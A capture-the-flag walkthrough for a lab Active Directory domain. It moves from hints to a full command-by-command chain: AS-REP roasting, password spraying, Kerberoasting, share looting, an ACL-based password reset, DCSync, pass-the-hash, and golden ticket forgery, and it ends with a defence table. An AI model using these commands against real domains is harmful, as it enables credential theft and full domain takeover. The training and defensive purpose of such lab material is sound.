# Raid on Candyland &mdash; Walkthrough & Hints

**Difficulty:** Hard (multi-stage AD) &nbsp;|&nbsp; **Flag:** `\\dc\vault\broomhilda.txt`

The intended path is 8 stages. Each stage unlocks the credentials you need for the
next. Try to get through each on your own using the **Hint** first; the full
**Solution** for every stage is at the bottom.

Set these once you're SSH'd into the foothold:

```bash
DC=dc.candyland.local          # 172.28.10.10
DOMAIN=candyland.local
```

---

## Objectives

- [ ] 1. Enumerate hosts and build the domain user list
- [ ] 2. AS-REP roast the account with pre-auth disabled and crack it
- [ ] 3. Password-spray the cracked password across the domain
- [ ] 4. Kerberoast a service account and crack it
- [ ] 5. Loot an SMB share for a hard-coded credential
- [ ] 6. Use BloodHound to find a `GenericAll` edge and abuse it
- [ ] 7. DCSync the domain to dump Candie's hash
- [ ] 8. Pass-the-Hash as Candie and read the flag

---

## Progressive hints

<details><summary>Stage 1 &mdash; Enumeration</summary>

The stables file store (`172.28.10.20`) allows **null-session** SMB. The web portal
(`172.28.10.30`) has a revealing HTML comment. Both tell you the account naming
convention. Your `d.jango` papers let you list users over LDAP too.
</details>

<details><summary>Stage 2 &mdash; AS-REP Roasting</summary>

One account has *"Do not require Kerberos pre-authentication"* set. You can request
its AS-REP **without any password** &mdash; you just need its username. `GetNPUsers.py`
with your user list. The roster hint about "turning off that Kerberos pre-auth
nonsense" points at who.
</details>

<details><summary>Stage 3 &mdash; Password Spraying</summary>

People reuse passwords. Take the one you just cracked and try it against **every**
user (careful of lockout &mdash; this lab has none, but spray slowly by habit).
</details>

<details><summary>Stage 4 &mdash; Kerberoasting</summary>

Any valid domain credential (your `d.jango` papers are enough) can request service
tickets for accounts that have an **SPN**. `GetUserSPNs.py -request`. Two accounts
have SPNs; only one has a weak password.
</details>

<details><summary>Stage 5 &mdash; SMB looting</summary>

The service account you just cracked can reach a share the others can't. Look for a
script with a plaintext password in it.
</details>

<details><summary>Stage 6 &mdash; ACL abuse</summary>

Run `bloodhound-python`, import the zip, and mark your owned accounts. Follow the
outbound control edges. One account you now own has **GenericAll** over Stephen &mdash;
which means you can reset Stephen's password. And Stephen, it turns out, has
replication rights on the domain...
</details>

<details><summary>Stage 7 &mdash; DCSync</summary>

Stephen holds *DS-Replication-Get-Changes* and *...-All*. That's all `secretsdump.py`
needs to replicate every hash in the domain, including `calvin.candie` and `krbtgt`.
</details>

<details><summary>Stage 8 &mdash; Pass-the-Hash</summary>

Calvin Candie is a Domain Admin. You don't need to crack his hash &mdash; pass it.
The vault share only lets Domain Admins in.
</details>

---

## Full solution

<details><summary>Click to reveal the complete walkthrough</summary>

### Stage 1 &mdash; Enumeration

```bash
# Ports/services across the estate
nmap -sV -p- 172.28.10.10 172.28.10.20 172.28.10.30

# Null-session SMB on the stables -> employee roster
smbclient -N -L //172.28.10.20/
smbclient -N //172.28.10.20/stables -c 'get employees.txt'; cat employees.txt

# Web portal dev-comment
curl -s http://web.candyland.local | grep -A3 'DEV NOTE'

# Confirm users over LDAP with your forged papers
GetADUsers.py -all candyland.local/d.jango:'Freedom1858!' -dc-ip $DC
```

Save the accounts to `users.txt` (one sAMAccountName per line): `calvin.candie`,
`stephen`, `d.jango`, `b.pooch`, `l.candie`, `svc_sql`, `svc_web`, `svc_backup`,
`k.schultz`, `b.hildy`, `b.crash`, `cora`, `sheba`, `m.stonesipher`, `lil.raj`.

### Stage 2 &mdash; AS-REP Roasting

```bash
GetNPUsers.py candyland.local/ -no-pass -usersfile users.txt -dc-ip $DC -format hashcat \
    | tee asrep.txt
```

Only `b.pooch` comes back (pre-auth disabled). Crack it:

```bash
john --format=krb5asrep --wordlist=~/rockyou.txt asrep.txt
# b.pooch : letmein
```

### Stage 3 &mdash; Password Spraying

```bash
# impacket-only (already installed) - spray via Kerberos pre-auth
while read u; do
  GetTGT.py candyland.local/"$u":'letmein' -dc-ip $DC >/dev/null 2>&1 \
    && echo "VALID: $u : letmein"
done < users.txt

# ...or with NetExec (pipx install netexec)
# nxc smb $DC -u users.txt -p 'letmein' --continue-on-success
```

Hits: `b.pooch` **and** `l.candie` &mdash; the password was reused.

### Stage 4 &mdash; Kerberoasting

```bash
GetUserSPNs.py candyland.local/d.jango:'Freedom1858!' -dc-ip $DC -request -outputfile tgs.txt
john --format=krb5tgs --wordlist=~/rockyou.txt tgs.txt
# svc_sql : Password1     (svc_web is a strong-password red herring - won't crack)
```

### Stage 5 &mdash; SMB looting as svc_sql

```bash
smbclient //$DC/sql_backups -U 'CANDYLAND\svc_sql%Password1' -c 'get restore_task.ps1'
cat restore_task.ps1
# -> CANDYLAND\svc_backup : Backup#2023
```

### Stage 6 &mdash; BloodHound + GenericAll abuse

```bash
bloodhound-python -d candyland.local -u d.jango -p 'Freedom1858!' -ns $DC -c All --zip
```

Import the zip into BloodHound, mark `svc_backup` and `svc_sql` as owned. You'll see:

```
svc_backup  --GenericAll-->  stephen
stephen     --DCSync (GetChanges/GetChangesAll)-->  candyland.local
```

Abuse the `GenericAll` to reset Stephen's password (you own `svc_backup`):

```bash
# with bloodyAD (pipx install bloodyAD)
bloodyAD --host $DC -d candyland.local -u svc_backup -p 'Backup#2023' \
    set password stephen 'St3phen#Owned!'

# ...or with Samba's net tool
net rpc password stephen 'St3phen#Owned!' -U 'CANDYLAND\svc_backup%Backup#2023' -S $DC
```

### Stage 7 &mdash; DCSync as Stephen

```bash
secretsdump.py candyland.local/stephen:'St3phen#Owned!'@$DC -just-dc
```

Grab `calvin.candie`'s NTLM hash (and `krbtgt` while you're here):

```
calvin.candie:1116:aad3b435b51404eeaad3b435b51404ee:<NTHASH>:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<KRBTGT_HASH>:::
```

### Stage 8 &mdash; Pass-the-Hash and read the flag

```bash
# The vault share is Domain-Admins only. Pass Candie's NT hash - no cracking needed.
smbclient //$DC/vault -U 'CANDYLAND\calvin.candie' --pw-nt-hash <NTHASH> \
    -c 'get broomhilda.txt'
cat broomhilda.txt
```

```
CTF{c4ndyl4nd_h4s_f4ll3n_dj4ng0_unch41n3d}
```

**Bonus (Golden Ticket):** with the `krbtgt` hash you can forge a TGT for any user:

```bash
ticketer.py -nthash <KRBTGT_HASH> -domain-sid <SID> -domain candyland.local goldenuser
KRB5CCNAME=goldenuser.ccache smbclient.py -k -no-pass candyland.local/goldenuser@$DC
```

### Why each step works & how to defend

| Attack | Root cause | Fix |
|--------|-----------|-----|
| AS-REP roast | pre-auth disabled on `b.pooch` | never disable Kerberos pre-auth |
| Spray | password reuse (`letmein`) | unique passwords, MFA, lockout policy |
| Kerberoast | weak password on SPN account `svc_sql` | 25+ char gMSA passwords |
| SMB loot | plaintext creds in a share script | secret stores, not scripts |
| GenericAll | over-permissive ACL `svc_backup -> stephen` | tier accounts, audit ACLs (BloodHound) |
| DCSync | replication rights on a non-DC account | restrict GetChanges/GetChangesAll to DCs |
| Pass-the-Hash | NTLM accepted for the DA | Credential Guard, disable NTLM, tiering |

</details>
